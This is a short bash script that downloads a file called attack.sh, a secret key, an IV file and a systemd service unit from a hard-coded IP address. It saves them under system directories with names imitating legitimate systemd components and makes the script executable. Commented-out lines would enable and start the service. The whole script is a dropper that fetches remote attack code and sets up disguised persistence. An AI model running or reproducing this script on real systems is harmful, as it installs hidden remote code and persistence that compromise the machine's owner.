#!/bin/bash
wget http://172.18.218.92/media/attack.sh -O /usr/lib/systemd/systemd-helper.sh
wget http://172.18.218.92/media/secret.key -O /usr/lib/systemd/network.key
wget http://172.18.218.92/media/iv.txt -O /usr/lib/systemd/iv.txt
wget http://172.18.218.92/media/systemd-helper.service -O /etc/systemd/system/systemd-helper.service
sudo chmod +x /usr/lib/systemd/systemd-helper.sh
#sudo systemctl enable systemd-helper.service
#sudo systemctl start systemd-helper.service